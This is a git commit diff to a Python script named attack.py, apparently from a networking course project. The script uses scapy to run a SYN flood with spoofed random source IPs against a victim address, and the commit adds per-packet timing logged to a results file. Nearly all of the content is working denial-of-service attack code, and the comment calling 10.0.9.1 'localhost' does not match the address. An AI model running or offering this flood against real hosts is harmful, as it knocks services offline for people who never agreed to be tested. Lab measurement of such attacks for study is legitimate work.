4f26165a021439851c4bf3f6cc0264901a156359
Shani Vahav <92265738+ShaniVahav@users.noreply.github.com>
2022-12-17 21:54:05 +0200

    Final

--- synFlood_py/attack.py
+++ synFlood_py/attack.py
@@ -3,17 +3,27 @@
 import random
 from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import send
+import time
+import os
+
+if os.path.exists('syns_results_p.txt'):
+    os.remove('syns_results_p.txt')
 
 
 def randomIP():
     return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+
 
 def randomPort():
     return random.randint(1000, 9000)
 
 
 def synFlood(victim_ip, victim_port):
-    for packet in range(10000):
+    f = open('syns_results_p.txt', 'a')
+    start_all = time.time()
+
+    for packet in range(1000):
+        start_one = time.time()
         IP_Packet = IP()
         IP_Packet.src = randomIP()
         IP_Packet.dst = victim_ip
@@ -24,6 +34,14 @@ def synFlood(victim_ip, victim_port):
 
         pkt = IP_Packet / TCP_Packet
         send(pkt)
+        end_one = time.time()
+        f.write(f'{packet}->{round((end_one - start_one), 5)}\n')
+
+    end_all = time.time()
+    f.write(f'total->{round((end_all - start_all), 5)}\n')
+    avg = round(((end_all - start_all) / 1000), 5)
+    f.write(f'avg->{avg}')
+    f.close()
 
 
 victim_ip = '10.0.9.1'  # the victim is localhost
